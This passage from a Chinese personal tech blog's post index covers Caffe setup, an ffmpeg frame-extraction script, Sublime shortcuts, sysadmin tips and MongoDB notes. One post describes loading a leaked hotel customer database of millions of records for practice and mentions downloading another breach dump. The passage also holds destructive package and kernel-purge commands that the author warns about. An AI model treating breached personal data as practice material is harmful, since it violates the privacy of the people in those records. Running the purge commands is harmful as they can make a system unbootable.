class=\"comment\">#如果你是直接采用在caffe目录下面进行make -j 4 all， 也未尝不可。</span></span><br><span class=\"line\">mkdir build</span><br><span class=\"line\"><span class=\"built_in\">cd</span> build</span><br><span class=\"line\">cmake ..</span><br><span class=\"line\">make -j 4 all</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#other， caffe 安装过程gcc ,g++ 4.7 版本，版本不同导致出现问题。不知道是否已经解决了。我之前安装的是5.8的吧，最后又装了4.7的才行。</span></span><br><span class=\"line\"><span class=\"comment\">#Youtube 上有个jestonhacks，还是不会安装的话可以看他的教程,不过他的教程也有很多问题，毕竟时间已经很久了。</span></span><br><span class=\"line\"><span class=\"comment\">#安装完成之后，去caffe官网跑个demo看看。</span></span><br><span class=\"line\"><span class=\"comment\">#也许你在安装opencv的过程中也会出现问题，那么，不论哪里出现了问题都记得多google即可。</span></span><br><span class=\"line\"><span class=\"comment\">#另附：没有显示器的情况下，用一根网线也是可以连接进Jeston TK1的，最初之所以没有连接进去，是因为以前用的时候设了静态IP，以至于不能重新获得新的IP。</span></span><br></pre></td></tr></table></figure>\n","categories":["学习数据挖掘的路上"],"tags":["学习笔记"]},{"title":"Nodejs In Uber","url":"http://iami.xyz/2016/08/20/uber-in-nodejs/","content":"<p><img src=\"/images//nodejsuber.jpg\" alt=\"img\"></p>\n<p>高清大图，嘿嘿。有点懒了。这是看nodejs in uber的介绍，记的笔记。<br>大概是log everything, monitor everthing, zero-config,处理好bug等。大家自己看一下视频的话或许更能明白。 </p>\n","categories":["全栈工程师"],"tags":["实习笔记"]},{"title":"Use ffmpeg to capture video frames","url":"http://iami.xyz/2016/08/16/Take-Something-In-FFMPEG/","content":"<h3 id=\"上午还在写单元测试，下午就干这件事：抽取一批视频抽取前面3秒，中间3秒，后面3秒的图片。一秒大概25帧\"><a href=\"#上午还在写单元测试，下午就干这件事：抽取一批视频抽取前面3秒，中间3秒，后面3秒的图片。一秒大概25帧\" class=\"headerlink\" title=\"上午还在写单元测试，下午就干这件事：抽取一批视频抽取前面3秒，中间3秒，后面3秒的图片。一秒大概25帧\"></a><font color=\"green\">上午还在写单元测试，下午就干这件事：抽取一批视频抽取前面3秒，中间3秒，后面3秒的图片。一秒大概25帧</font></h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"><span class=\"built_in\">set</span> -e\t</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">去掉后脚本可跳过错误继续运行</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">ls *.mp4 &gt; filelist.txt</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">du -h *.mp4 | grep -v <span class=\"string\">\"4.0K\"</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span> &gt; filelist.txt</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">由于后期发现有的监控视频很小，所以要改。还有不能先awk <span class=\"built_in\">print</span>需要先grep再进行<span class=\"built_in\">print</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">mkdir imageCut</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">cat filelist.txt | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> filename</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">此处属于莫名奇妙不能用<span class=\"keyword\">while</span> </span></span><br><span class=\"line\">for filename in `cat filelist.txt`</span><br><span class=\"line\">do</span><br><span class=\"line\">\tpathname=$(echo $filename | cut -d \".\" -f1 )</span><br><span class=\"line\">\techo $pathname</span><br><span class=\"line\">\tmkdir $PWD/imageCut/$pathname</span><br><span class=\"line\">\techo \"Process in $filename, and it will be set in $pathname\"</span><br><span class=\"line\">\tsleep 1</span><br><span class=\"line\">\ttime=`ffprobe -v error -show_entries stream=width,height,bit_rate,duration -of default=noprint_wrappers=1 $filename  | grep \"duration\" | cut -d \"=\" -f2 | cut -d \".\" -f1` #获取总的视频时长</span><br><span class=\"line\"></span><br><span class=\"line\">\tmiddletime=`expr $time / 2 - 3`</span><br><span class=\"line\">\tendtime=`expr $time - 3`</span><br><span class=\"line\">\techo $middletime</span><br><span class=\"line\">\tm_time=$middletime-3</span><br><span class=\"line\">\tffmpeg -ss 00:00 -t 3 -i $filename -q:v 2 -f image2 $PWD/imageCut/$pathname/imagehead-%d.jpg　2&gt;&gt;log.err\t\t#get the first 3 second image frames to des and log the err in current folder</span><br><span class=\"line\">\tffmpeg -ss $middletime -t 3 -i $filename -q:v 2 -f image2 $PWD/imageCut/$pathname/imagmiddle-%d.jpg 2&gt;&gt;log.err\t#get the middle 3 second image frames</span><br><span class=\"line\">\tffmpeg -ss $endtime -t 3 -i $filename -q:v 2 -f image2 $PWD/imageCut/$pathname/simageend-%d.jpg 2&gt;&gt;log.err\t#get the last 3 second image frames</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">\t#</span><span class=\"bash\">mv $(ls *.jpg) <span class=\"variable\">$PWD</span>/imageCut/<span class=\"variable\">$pathname</span></span></span><br><span class=\"line\"><span class=\"meta\">\t#</span><span class=\"bash\">这样的写法不严谨，脚本通用率就低了，你也不知道该目录下有没有其他img文件。直接在输出时定位过去。</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">rm -f filelist.txt</span><br></pre></td></tr></table></figure>\n<p>###　<br>后来又分析了下errlog，发现中间有一些视频是不能抽取的，但是呢，总的抽取过程中，所有视频基本上都是226张左右，也就是说是正常的，但是6万多张图片中，大概800张抽取错误。现在分析是视频不完整导致的。</p>\n","categories":["全栈工程师"],"tags":["实习笔记"]},{"title":"成为全栈工程师过程中的踩过的坑","url":"http://iami.xyz/2016/08/08/backup-when-learn-web/","content":"<h3 id=\"一些踩过的坑\"><a href=\"#一些踩过的坑\" class=\"headerlink\" title=\"一些踩过的坑\"></a>一些踩过的坑</h3><p>1.不要jade中同时用Space和Tab，一不留神就使用了，全他妈是错误呀</p>\n<p>2.我记得之前有个E: Sub-process /usr/bin/dpkg returned an error code (1)</p>\n<blockquote>\n<p>之前我的解决办法是按照网上来的，大概是大一的时候，<br>现在想想，当时完全没有动脑筋思考。</p>\n<blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mv /var/lib/dpkg/info /var/lib/dpkg/info.bak </span><br><span class=\"line\">sudo mkdir /var/lib/dpkg/info</span><br></pre></td></tr></table></figure>\n</blockquote>\n</blockquote>\n<p>其实这种写法完全不如<code>killall aptd</code>,而且不需要去考虑是不是错杀其他进程，因为apt-get install 都是独占的。只允许一个存在。</p>\n<p>3.网站优化压缩代码时使用的是YUICompressor，之后会另写一篇单独记录网站的性能提升与优化的问题。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ` find <span class=\"variable\">$PWD</span> | grep -oE <span class=\"string\">\"(.)*\\.css_$\"</span>` </span><br><span class=\"line\"><span class=\"keyword\">do</span> </span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">echo</span> <span class=\"variable\">$i</span></span><br><span class=\"line\">\tyuicompressor.jar --<span class=\"built_in\">type</span> css -o <span class=\"variable\">$i</span><span class=\"string\">\"_\"</span> <span class=\"variable\">$i</span></span><br><span class=\"line\">\tmv <span class=\"variable\">$i</span> `<span class=\"built_in\">echo</span> <span class=\"variable\">$i</span> | tr -d <span class=\"string\">\"_\"</span>`</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p><code>find ./ -name &quot;*.jpg&quot; -print0 | xargs -0 jpegtran -copy none -optimize {} &gt; {}.jpg</code></p>\n<blockquote>\n<p>对mp4文件压缩的时候依旧使用的是ffmpeg,又转了一份文件为webm格式的。</p>\n<blockquote>\n<p>ffmpeg转换的时候，后来发现其实是有三种方法的。可以直接指定大小，可以指定优化帧率，还可以优化图像质量来减小体积。</p>\n<blockquote>\n<p><code>ffmpeg -i index_1.mp4 -acodec mp2 --psnr 1 output1.mp4</code></p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>4.添加白名单更安全</p>\n<p>5.cat {file1,file2} &gt; file3</p>\n<blockquote>\n<p>不要手残在file1,file2之间用了空格,其实是想说不要在shell里面手残乱敲空格，我完全是习惯性的敲空格，坑死了。</p>\n</blockquote>\n<p>6.谷歌浏览器命令行开窗口</p>\n<blockquote>\n<p>shell</p>\n<blockquote>\n<ul>\n<li><code>chromium-browser --new-window &quot;url&quot;</code></li>\n</ul>\n</blockquote>\n<p>windows(应该也有其他方法)</p>\n<blockquote>\n<ul>\n<li><code>start your/path/of/chrome &quot;urllist1&quot;,&quot;urllist2&quot;</code></li>\n</ul>\n</blockquote>\n</blockquote>\n<p>7.<font color=\"green\">NodeJS debuging and Profiling </font></p>\n<ul>\n<li>Know the api docs </li>\n<li>Use strict mode</li>\n<li>Name your inline function</li>\n<li>Don’t forget callbacks are error first</li>\n</ul>\n<blockquote>\n<p>埋个关于调试的坑，还会单补一篇。 </p>\n</blockquote>\n<p>8.不要在属性值和单位之前留空格，否则不在IE6中有效。其实我是一点也不在乎IE6，。</p>\n<p>9.MVC只是手段，不是目的。不要把目的和手段搞反了。最终目的是模块分离和代码复用。</p>\n<p>10.不要使用grenn 和 red类的字符来设置颜色，使用#ffffff之类的进行设置。(其实这一点我有点不理解)</p>\n","categories":["全栈工程师"],"tags":["实习笔记"]},{"title":"PPT and CodeReview from a new beginner","url":"http://iami.xyz/2016/07/29/first-codereview-in-tuicorn/","content":"<h4 id=\"第一次在公司里参加code-review-当然除了检查代码，还有一部分是对我基础知识的检查。毕竟我之前不是做web的，也没有怎么接触过js，当然，觉得还行吧。马马虎虎。\"><a href=\"#第一次在公司里参加code-review-当然除了检查代码，还有一部分是对我基础知识的检查。毕竟我之前不是做web的，也没有怎么接触过js，当然，觉得还行吧。马马虎虎。\" class=\"headerlink\" title=\"第一次在公司里参加code review,当然除了检查代码，还有一部分是对我基础知识的检查。毕竟我之前不是做web的，也没有怎么接触过js，当然，觉得还行吧。马马虎虎。\"></a>第一次在公司里参加code review,当然除了检查代码，还有一部分是对我基础知识的检查。毕竟我之前不是做web的，也没有怎么接触过js，当然，觉得还行吧。马马虎虎。</h4><p><img src=\"/images//fc-first/fc-01.JPG\" alt=\"img1\"><br><img src=\"/images//fc-first/fc-02.JPG\" alt=\"img2\"><br><img src=\"/images//fc-first/fc-03.JPG\" alt=\"img\"><br><img src=\"/images//fc-first/fc-04.JPG\" alt=\"img\"><br><img src=\"/images//fc-first/fc-05.JPG\" alt=\"img\"><br><img src=\"/images//fc-first/fc-06.JPG\" alt=\"img\"><br><img src=\"/images//fc-first/fc-07.JPG\" alt=\"img\"><br><img src=\"/images//fc-first/fc-08.JPG\" alt=\"img\"><br><img src=\"/images//fc-first/fc-09.JPG\" alt=\"img\"></p>\n<p><font color=\"green\">当时还临时让解释了cookie和session的不同，还临时让讲了下为什么把css放上面，js放下面，dom树的渲染步骤等乱七八糟的。</font></p>\n<blockquote>\n<p>这篇是在windwos下写的，链接图片的时候是小写的.jpg后缀(虽然文件本身后缀是大写的)，能用。但是不知道为什么到了LINUX下，不能发现，还要把后缀改为JPG.而且文件夹名中的横杠存不存在，都能被查找到，这又是什么个情况。</p>\n</blockquote>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><p><a href=\"/images//fc-first/firstime.pptx\">Little PPT</a></p>\n","categories":["全栈工程师"],"tags":["实习笔记"]},{"title":"全栈工程师的第一篇修炼记录","url":"http://iami.xyz/2016/07/20/Action-in-Full Stack/","content":"<h1 id=\"本篇多吐槽，属于Take-is-cheap\"><a href=\"#本篇多吐槽，属于Take-is-cheap\" class=\"headerlink\" title=\"本篇多吐槽，属于Take is cheap\"></a>本篇多吐槽，属于Take is cheap</h1><ul>\n<li><font color=\"green\">全炸工程师的前言　从德回来之后，本以为这家公司应该已经招满了，后来老师碰见，问我去了没。才打电话问了问，最后应聘做了测试的实习。公司小，所以现在做的就更像是全栈开发，网页也有，后端也有，偶尔还帮别人装下caffe,看看python脚本。总之地方虽小，却像实验室一样，对我而言，心里还是蛮喜欢的。起码最初是比较喜欢的。但有时候也会觉得像炸了一样，因为不想跑偏太远。毕竟我打心里还是想做数据分析数据挖掘这一块的。然而抱怨是没有用的，我还是希望靠自己的努力来搞定这一切。以后这个系列，将记载一下我对全栈的认识(成为真正的全栈)，和在实习期间的一些思考。这可是我第一份技术相关的无关技术的实习。啊啊啊啊</font>\n\n</li>\n</ul>\n<h3 id=\"面试篇\"><a href=\"#面试篇\" class=\"headerlink\" title=\"面试篇 \"></a><font color=\"red \">面试篇 </font></h3><ul>\n<li>由于是应的是测试，又是实习，所以只有一面，也只问了简单的一些问题用过哪些语言，给自己掌握的不同语言打个分。 </li>\n<li>问对算法能力的掌握程度</li>\n<li>你为什么选择我们，给我一个选你的理由</li>\n<li>从上大学到现在代码量有多少</li>\n<li>自己做过什么项目，项目介绍，评价</li>\n</ul>\n<blockquote>\n<font color=\"blue \">　只想说大家一定要自信，谦虚可以，别太谦虚，否则别人会以为你不行。而且到时候也没资本去给人家谈工资了。总之呢，我的面试没有什么精彩，自己也不该太谦虚，一定不要妄自菲薄，面试的时候就是表现自己的时候 </font>\n\n\n</blockquote>\n<h3 id=\"入职篇\"><a href=\"#入职篇\" class=\"headerlink\" title=\"入职篇 \"></a><font color=\"red \">入职篇 </font></h3><ul>\n<li>经历了工资的尴尬，下面是自己的入职第一周。开始了测试和全栈的生涯。每天都是第一个去，不卑不亢。大家人都很好，但一脚踏入社会，就需要时间去融入。<br>JavaScript之前略有接触，而现在做的东西都是以JS为主，nodejs做后端，前端自然就是那一套了。<br>然后大概花了一周时间熟悉了下javascript和nodejs，CSS的流式布局，js和css通过V8对DOM的不同操作方式。就开始配着项目写业务代码了。先是最基本的modal，然后写数据库里面取数据写数据。<br>不知道写什么了，基础的代码不具有什么太深的意义。更多的更像脚代码一样。是没有算法涉及其中的。<br>但是你必须在很短的时间内跟的上步伐，然后超过去。这两周给我的感觉就是在短时间内扩充了大量的知识，但是在应用上还是有问题，也就是说，看得懂不一定写的出来。中间还多亏了带我的晓伍哥的帮忙。多谢了。</li>\n</ul>\n<h3 id=\"面试之前\"><a href=\"#面试之前\" class=\"headerlink\" title=\" 面试之前　\"></a><font color=\"green \"> 面试之前　</font></h3><p>我相信一切都会好起来的。所谓此心安处即吾乡。然浮萍在世，所见着少，所知者就更少了。</p>\n<p>不希望给自己找借口，never, take is cheap.</p>\n<p>最后，剩下几张整理下资源和实习过程中遇到的问题以及解决办法。。</p>\n","categories":["全栈工程师"],"tags":["实习笔记"]},{"title":"sublime 快捷键以及其他","url":"http://iami.xyz/2016/06/26/sublime-useful/","content":"<h3 id=\"sublime使用\"><a href=\"#sublime使用\" class=\"headerlink\" title=\"sublime使用\"></a>sublime使用</h3><ul>\n<li>Ctrl+K+B：开关侧栏</li>\n<li>Ctrl+Shift+P：打开命令面板</li>\n<li>Ctrl+P：搜索项目中的文件</li>\n<li>Ctrl+G：跳转到第几行</li>\n<li>Ctrl+W：关闭当前打开文件</li>\n<li>Ctrl+Shift+W：关闭所有打开文件</li>\n<li>Ctrl+Shift+V：粘贴并格式化</li>\n<li>Ctrl+D：选择单词，重复可增加选择下一个相同的单词</li>\n<li>Ctrl+L：选择行，重复可依次增加选择下一行</li>\n<li>Ctrl+Shift+L：选择多行</li>\n<li>Ctrl+Shift+Enter：在当前行前插入新行</li>\n<li>Ctrl+X：删除当前行</li>\n<li>Ctrl+M：跳转到对应括号</li>\n<li>Ctrl+U：软撤销，撤销光标位置</li>\n<li>Ctrl+J：选择标签内容</li>\n<li>Ctrl+F：查找内容</li>\n<li>Ctrl+Shift+F：查找并替换</li>\n<li>Ctrl+H：替换</li>\n<li>Ctrl+R：前往 method</li>\n<li>Ctrl+N：新建窗口</li>\n<li>Ctrl+K+B：开关侧栏</li>\n<li>Ctrl+Shift+M：选中当前括号内容，重复可选着括号本身</li>\n<li>Ctrl+F2：设置/删除标记</li>\n<li>Ctrl+/：注释当前行</li>\n<li>Ctrl+Shift+/：当前位置插入注释</li>\n<li>Ctrl+Alt+/：块注释，并Focus到首行，写注释说明用的</li>\n<li>Ctrl+Shift+A：选择当前标签前后，修改标签用的</li>\n<li>F11：全屏</li>\n<li>Shift+F11：全屏免打扰模式，只编辑当前文件</li>\n<li>Alt+F3：选择所有相同的词</li>\n<li>Alt+.：闭合标签</li>\n<li>Alt+Shift+数字：分屏显示</li>\n<li>Alt+数字：切换打开第N个文件</li>\n<li>Shift+右键拖动：光标多不，用来更改或插入列内容</li>\n<li>鼠标的前进后退键可切换Tab文件</li>\n<li>按Ctrl，依次点击或选取，可需要编辑的多个位置</li>\n<li>按Ctrl+Shift+上下键，可替换行 </li>\n</ul>\n<h3 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h3><ul>\n<li>Sublime版本升级之后，Online Markdonw Preview不能使用的解决办法</li>\n</ul>\n<blockquote>\n<p>把属性扩展那一行替换为<code>&quot;extensions&quot;: [&quot;tables&quot;, &quot;fenced_code&quot;, &quot;codehilite&quot;]</code>(中间有个插件忘了是什么了，要删除掉，删除后就是这样的了)</p>\n</blockquote>\n<ul>\n<li>Sublime自动保存只需要配置文件中添加”save_on_focus_lost”: true</li>\n</ul>\n<h3 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h3><p><a href=\"https://github.com/tanepiper/SublimeText-Nodejs\" target=\"_blank\" rel=\"noopener\">sublime 配置 Nodejs </a></p>\n<p><a href=\"http://macplay.leanote.com/post/%E8%BF%91%E4%B9%8E%E5%AE%8C%E7%BE%8E%E7%9A%84-Markdown-%E5%86%99%E4%BD%9C%E4%BD%93%E9%AA%8C-Sublime-Text-3-OmniMarkupPreviewer\" target=\"_blank\" rel=\"noopener\">sublime markdown 插件</a></p>\n<p><a href=\"http://frontenddev.org/article/sublime-does-text-3-plug-in-emmet-original-zencoding.html\" target=\"_blank\" rel=\"noopener\">sublime zencodeing 插件</a></p>\n","categories":["HowTo"],"tags":["知识回顾"]},{"title":"小技巧 III","url":"http://iami.xyz/2016/06/02/-Something3/","content":"<ul>\n<li><p>文件给别人看，最好<font color=\"blue\">存储为pdf格式</font>，你懂的。<font color=\"blue\">做好的word啊ppt啊，保存时把字体等嵌入进去，这样换个电脑也能用</font>。最好适当的保存一个低版本的。不用因为乱七八糟的原因重发一遍</p>\n</li>\n<li><p>删除恶意文件的方法和思路（朋友来拷权利的游戏S06给我的U盘中了快捷方式病毒）</p>\n<blockquote>\n<ol>\n<li>网上百度了个方法，清理，无果。不过隐藏文件夹已经恢复，但快捷方式无法删除，每次删除，必然恢复。<ol>\n<li>用everything找到了电脑中出现的所有fuck girl的vbs脚本，发现在local/tmp有一份，但删除不掉</li>\n<li>vbs脚本已经加载到wscipt中了，所以结束这个进程，再去删除，搞定</li>\n</ol>\n</li>\n</ol>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>网页文件保存，<blockquote>\n<ul>\n<li>Ctrl+P打印–&gt;另存为pdf<ul>\n<li>Ctrl+S保存，但是保存时会有一个文件夹出现，所以保存时选择仅仅保存html</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n</li>\n<li><p>发现一个好玩的linux工具叫做boxes,用来生成ASCll字符</p>\n<blockquote>\n<p><img src=\"/images//boxes/boxes2.png\" alt=\"dd\"><br>  <img src=\"/images//boxes/boxes3.png\" alt=\"dd\"><br>类似还有matrix,sl,等等 apt-get install 就可以玩了</p>\n</blockquote>\n</li>\n<li><p>善用Fiddler或者Wireshark抓包，分析一下(其实看一眼算不上分析)，就能找到真正的地址，通过Wireshark得到的数据可以导出所有数据为各种格式，也可以单独导出某段数据，还可以TCP FLLOW， 还可以过滤查询，这个过滤查询功能都有。Fiddler还可以作为同一局域网代理，抓流经手机的流量。</p>\n</li>\n<li><p>如果速度不佳，考虑换换源，包括但不限于ubuntu源，ruby源等</p>\n</li>\n<li><p>有时候windos配置开发环境很蛋疼，对于复杂的，linux也一样，这时候不如选择配置好的镜像，直接载入虚拟机，同时<a href=\"https://www.docker.com/\" target=\"_blank\" rel=\"noopener\">docker</a>的使用也节省了很多的时间。当然也可以考虑下云端环境的应用，像编程的<a href=\"https://c9.io/\" target=\"_blank\" rel=\"noopener\">Cloud9</a>,写latex去<a href=\"http://sharelatex.com\" target=\"_blank\" rel=\"noopener\">ShareLatex</a>,省的自己配置latex环境了，而且编译速度比自己电脑快多了。</p>\n</li>\n<li><p>shell换成zsh 并使用 oh-my-zsh</p>\n</li>\n<li><p>youtube 上下载东西，用那个savefrom.net上的插件下载的话，实在是慢，不能完全利用vpn,所以只使用其获取链接，然后交给迅雷来下。还可以用youtube-dl命令行工具。</p>\n</li>\n<li><p>有时候可以直接保存一个网页下来，然后nodepad++开始正则搜索，想要下载的链接全部到手。当然也可以直接在网页上搜索</p>\n</li>\n<li><p>不要局限于本地，找不到都可以去找云端资源，包括但不限与电影，pdf转换，正则匹配，加密解密，云端编辑器，开发环境，资源是种东西，跟着需求变得。哪里都可以有。</p>\n</li>\n</ul>\n<blockquote>\n<p>   警示： </p>\n<blockquote>\n<ul>\n<li>对于有重要信息或敏感信息的电脑，请杜绝别人U盘插入。</li>\n<li>无论是什么错误，基本上只要思路对，抽丝剥茧，顺藤摸瓜，肯定搞定。<ul>\n<li>要记得自己的目的是什么，写代码，省时间，还是锻炼配置能力，然后选择</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n</blockquote>\n<p>有的记不起来了，还有正则很有用，mongo不要在windows下用，太坑。</p>\n","categories":["HowTo"],"tags":["小手段"]},{"title":"Mongo的故事","url":"http://iami.xyz/2016/06/01/Mongo-And-HanTing/","content":"<h2 id=\"汉庭csv\"><a href=\"#汉庭csv\" class=\"headerlink\" title=\"汉庭csv\"></a>汉庭csv</h2><p>汉庭的2000万数据，很老的裤子了，拿出来练练mongo</p>\n<blockquote>\n<p><code>find ./ -type f -name &quot;*.csv&quot;  -exec mongoimport -d hanting -c human --type csv --headerline {} \\;</code></p>\n</blockquote>\n<ul>\n<li>关于导入导出<blockquote>\n<p><code>$mongoimport -d dbname -c collectionsname --type csv --headerline inputfilname.csv</code>    </p>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>很明显不用多说,headerline是看csv文件具不具有头字段<blockquote>\n<p><code>$mongoexport -d dbname -c collectionsname -o outputfilename.csv</code></p>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>关于备份和恢复<blockquote>\n<p><code>mongodump -h localhost --post 27017</code></p>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>数据库内容导出为BSON文件<blockquote>\n<p><code>mongorestore -h localhost --port 27017 dump</code></p>\n</blockquote>\n</li>\n<li>如果说是导入到一个已经存在数据库里，那么使用 <code>mongorestore -h localhost --port 271707 --drop /path/to/you/dump</code>, 还有一种是给予数据文件的备份，但是这种的话快虽快，但是却要锁定数据库。<br>csv 数据一共是 2.9G 导入到数据库中一共是 15.946GB，大概花费了9分钟左右，而且数据一共是1400+万条左右，并没有宣称地2000万，也可能是下的不全。对于我这个临时装的系统，直接占去了将近1/3的空间，不过总体来讲还是比较满意。</li>\n</ul>\n<p>之前在windows下导入时，仅仅导入了200W不到的数据就花费了很长时间，最后由于没能跳过一个错误数据还终止了。不过对于错误数据，直接sed替换下就行了。windows肯定干不了吧。</p>\n<p>导入的过程中出现的错误数据会自动跳过，这个好。</p>\n<h1 id=\"数据库\"><a href=\"#数据库\" class=\"headerlink\" title=\"数据库\"></a>数据库</h1><blockquote>\n<p> <code>db.account.aggregate([{ $group: {_id: {$month:&quot;$createdAt&quot;},all:{ $sum: 1 }}}]);</code></p>\n</blockquote>\n<ul>\n<li>在mongo里面，获取当月新注册的用户。关键字还可以是<code>$year,$day</code>等，$createdAt是你自己插入数据记录的标准时间</li>\n</ul>\n<blockquote>\n<p><code>$mongod --config /path/file/to/you/mongo.config</code></p>\n</blockquote>\n<ul>\n<li>mongo.config文件里面包含了log路径,db路径，还可以添加其他设置。之前win7升级win10，mongo的环境变量就没了。懒得添加，就写了批处理，要提的是，可以是.bat也可以.cmd,在脚本里面用start的话可以打开新的cmd界面。</li>\n</ul>\n<blockquote>\n<p><code>mongod --auth</code></p>\n</blockquote>\n<ul>\n<li>开启身份验证的前提是创建了管理员用户,然后use admin, db.addUser(‘username’,’password’),</li>\n</ul>\n<p>突然想起网易50亿的裤子，从mega下了快30G还是放弃了。电脑开了两天，破宿舍晚上又断网。唉，无奈还是删了。我又想起来之前看f4vk写的搭建社工库的教程。无力。</p>\n<h2 id=\"Mongo-Night\"><a href=\"#Mongo-Night\" class=\"headerlink\" title=\"Mongo Night\"></a>Mongo Night</h2><ul>\n<li>就像mongo in Action中的警告一样，对于大量数据，不要在部署之后再建立索引，而应该事先建立好索引。</li>\n<li>当时突然想到要是把Solr和Mongo结合到一起会是怎么样，发现网上已经有了这方面的资料。</li>\n<li>最好主从节点复制集至少三个</li>\n<li>正确的分片很重要(索引也是)</li>\n</ul>\n<p>ps:本来打算的是写成mongo morning to night,把基础知识记下来，后来发现其实没有必要。基本的增删查改没必要写,其他的也不少，我自己就做了8张A4纸的笔记。所以还是自己看看附件吧，下载下来看一遍是比较有用的。</p>\n<h2 id=\"Resoures\"><a href=\"#Resoures\" class=\"headerlink\" title=\"Resoures:\"></a>Resoures:</h2><ul>\n<li><a href=\"/assets/MongoDB in Action.pdf\">MongoDB in Action</a></li>\n<li><a href=\"/assets/Ruby and MongoDB Web Development.pdf\">Ruby and MongoDB Web Development</a></li>\n<li><a href=\"https://docs.mongodb.com/\" target=\"_blank\" rel=\"noopener\">Mongo Doc</a></li>\n</ul>\n","categories":["学习数据挖掘的路上"],"tags":["学习笔记","数据存储"]},{"title":"小技巧 II","url":"http://iami.xyz/2016/05/16/Something2/","content":"<ul>\n<li><p>window下在一个文件夹内，按住shift之后右键，可以看到在此处打开命令行。当然还有一种方法是直接把要执行的文件拖进来即可。不过还是比较喜欢右键终端的方式。</p>\n</li>\n<li><p>下载youtube视频，例如 www.youtube.com/sssdsdsds/ ，直接在youtube前加ss即可，即：www.ssyoutube.com/sssdsdsds</p>\n</li>\n<li><p>Mantra是个很好用的浏览器，其实就是firefox集成完一大堆的插件，对于我来说是比较方便的(此处有坏笑)。</p>\n</li>\n<li><p>mosh而不是ssh，是上次看到freemind的博客之后知道的，很方便，可以保存断网后的状态。很方便就能恢复工作空间，实乃手机远程服务器的必备物品。</p>\n</li>\n<li><p>shell命令之nautilus，这个命令好像都知道吧，就是打开个文件管理窗口，sudo 打开的具有所有权限，满足拖拽欲。</p>\n</li>\n<li><p>删除旧的内核 </p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo aptitude purge ~ilinux-image-.*\\(\\!`uname -r`\\)</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p><font color=\"red\">这个记住写博客的时候要注意markdown中会对\\进行转义</font><br>按道理讲是没有问题的，但用这个删掉了我所有内核，启动项都没了。不过别怕，打开livecd搞个同版本的先拷进去就能用了。</p>\n</blockquote>\n<ul>\n<li>jekyll好像有问题了，需要在_config.yml中加入<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gems :</span><br><span class=\"line\">\t- jekyll-paginate</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n</ul>\n<font color=\"red\"> 这个一定要注意格式 </font>\n\n<ul>\n<li>对了，有时候挂载不了盘，ntfs格式的用ntfsfix /dev/sda3(那个你挂载不了的设备)，<br>但是ext格式的呢，可以先去media下面建个文件夹sda3（文件夹名字可以随意），然后mount即可<blockquote>\n<figure class=\"highlight bash\"><table><tr><td 